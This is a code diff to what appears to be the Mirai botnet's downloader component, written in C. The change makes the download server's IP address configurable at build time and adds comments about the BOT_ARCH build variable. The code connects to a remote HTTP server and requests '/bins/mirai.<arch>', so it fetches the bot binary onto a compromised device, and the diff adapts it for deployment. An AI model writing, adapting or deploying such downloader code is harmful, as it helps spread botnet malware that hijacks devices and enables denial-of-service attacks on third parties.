@@ -5,7 +5,11 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define HTTP_SERVER utils_inet_addr(127,0,0,1) // CHANGE TO YOUR HTTP SERVER IP
+#ifdef HTTP_SERVER_IP1
+#define HTTP_SERVER utils_inet_addr(HTTP_SERVER_IP1,HTTP_SERVER_IP2,HTTP_SERVER_IP3,HTTP_SERVER_IP4)
+#else
+#define HTTP_SERVER utils_inet_addr(127,0,0,1) // DEFAULT: localhost (change with build script)
+#endif
 
 #define EXEC_MSG            "MIRAI\n"
 #define EXEC_MSG_LEN        6
@@ -89,6 +93,9 @@ inline void run(void)
     struct sockaddr_in addr;
     int sfd, ffd, ret;
     unsigned int header_parser = 0;
+
+    //Ignore the Error The variable BOT_ARCH is not defined in this code snippet.
+    //It is filled while compiling the code using build.sh.
     int arch_strlen = sstrlen(BOT_ARCH);
 
     write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);
@@ -127,7 +134,8 @@ inline void run(void)
 #ifdef DEBUG
     printf("Connected to host\n");
 #endif
-
+    //Ignore the Error The variable BOT_ARCH is not defined in this code snippet.
+    //It is filled while compiling the code using build.sh.
     if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
     {
 #ifdef DEBUG
